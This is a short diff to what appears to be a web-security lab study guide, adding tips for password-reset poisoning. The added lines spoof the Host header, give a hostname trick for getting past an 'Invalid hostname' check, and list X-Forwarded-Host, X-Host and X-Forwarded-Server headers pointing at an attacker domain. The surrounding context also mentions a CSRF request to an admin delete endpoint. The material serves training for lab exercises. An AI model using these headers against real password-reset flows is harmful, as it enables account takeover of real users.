@@ -221,3 +221,8 @@ def handleResponse(req, interesting):
   And send group in single connection
   POST /admin/delete with csrf and username parameters
 
+- When spoofing host header on password reset using `Host:` or `X-Forwarded-Host:`, if you receive the error `Invalid hostname`, try using the following hostname: `xxx.oastify.com?TARGET.net` legit target URL without a slash.
+  Include the below `X-` headers and change the username parameter on the password reset request to `Carlos` before sending the request.
+  X-Forwarded-Host: EXPLOIT.net
+  X-Host: EXPLOIT.net
+  X-Forwarded-Server: EXPLOIT.net
